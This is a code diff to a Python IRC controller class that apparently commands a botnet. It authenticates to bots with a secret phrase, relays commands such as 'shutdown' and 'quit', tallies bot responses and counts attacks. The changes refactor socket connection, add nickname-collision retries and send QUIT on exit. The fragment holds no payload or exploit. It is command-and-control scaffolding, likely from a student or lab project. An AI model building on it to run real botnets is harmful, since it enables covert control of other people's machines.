@@ -17,9 +17,9 @@ class Controller_Client:
         self.attack_counter = 0
 
     def start_client(self):
-        connected = self.__attempt_connection()
+        connected, self.irc_socket = self.__attempt_connection(5)
         if connected:
-            self.send_to_channel("testy")
+            self.send_to_channel(self.secret_phrase)
         while connected:
             text = self.get_text()
             self.log(text)
@@ -36,7 +36,10 @@ class Controller_Client:
 
     #TODO define functionality for each command 
     def __send_command(self, command):
-        self.send_to_channel(command)
+        if command == "quit":
+            self.__terminate()
+        else:
+            self.send_to_channel(command)
         timeout = 5 # timeout (in seconds)
         timeout_start = time.time()
         self.log("Waiting for responses...")
@@ -81,11 +84,7 @@ class Controller_Client:
             self.log("Total: " + str(successful) + " successful, " + \
                      str(unsuccessful) + " unsuccessful")
             return True
-        
-        elif command == "quit":
-            self.__terminate()
-            return True
-        
+
         elif command == "shutdown":
             total_sd = 0
             for bot in response_dict:
@@ -101,6 +100,7 @@ class Controller_Client:
     # Closes connection and terminates controller
     def __terminate(self):
         self.log("Terminating...")
+        self.send_to_channel("QUIT")
         self.irc_socket.close()
         sys.exit()
 
@@ -111,29 +111,41 @@ class Controller_Client:
             self.send_msg('PONG ' + text.split()[1] + 'rn')
         return text
     
-    def __attempt_connection(self):
+    # attempts connection with an input timeout in seconds
+    def __attempt_connection(self, timeout):
         connected = False
-        timeout = 5 # timeout (in seconds)
-        timeout_start = time.time()
-        while not connected and (time.time() < timeout_start + timeout):
-            connected = self.__connect()
+        connected, conn_socket = self.__connect(timeout)
         if not connected:
             self.log("Error: Connection to Host: " + self.host + \
-                     " on Port: " + str(self.port) + " timed out.")
-        return connected
+                     " on Port: " + str(self.port) + " failed.")
+        return connected, conn_socket
 
-    def __connect(self):
-        self.irc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    def __connect(self, timeout):
+        conn_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        conn_socket.settimeout(timeout)
         try:
-            self.irc_socket.connect((self.host, self.port))  # connect to server
-        except Exception:
-            return False
+            #TODO connect will stay hung up if the host is real
+            conn_socket.connect((self.host, self.port))  # connect to server
+        except socket.error as msg:
+            return False, None
+        conn_socket.settimeout(None)
+        conn_socket.send(("USER "+ self.nick +" "+ self.nick +" "+ self.nick + \
+        " :\n").encode()) # user authentication
+        self.__establish_nick(conn_socket)
+        conn_socket.send(("JOIN "+ self.channel +"\n").encode()) # join the channel
+        return True, conn_socket
 
-        self.send_msg("USER "+ "test" +" "+ self.nick +" "+ self.nick + \
-        " :\n") # user authentication
-        self.send_msg("NICK "+ self.nick+"\n") # sets nick
-        self.send_msg("JOIN "+ self.channel +"\n") # join the channel
-        return True
+    # keeps sending nick messages until a valid nick is found
+    def __establish_nick(self, conn_socket):
+        valid_nick = False
+        while not valid_nick:
+            conn_socket.send(("NICK "+ self.nick+"\n").encode()) # sets nick
+            response = conn_socket.recv(2040).decode()
+            if "433" in response:
+                self.bot_counter += 1
+                self.bot_nick = "robotnik" + str(self.bot_counter)
+            elif "001" in response:
+                valid_nick = True
 
     # function for logging messages
     def log(self, message):
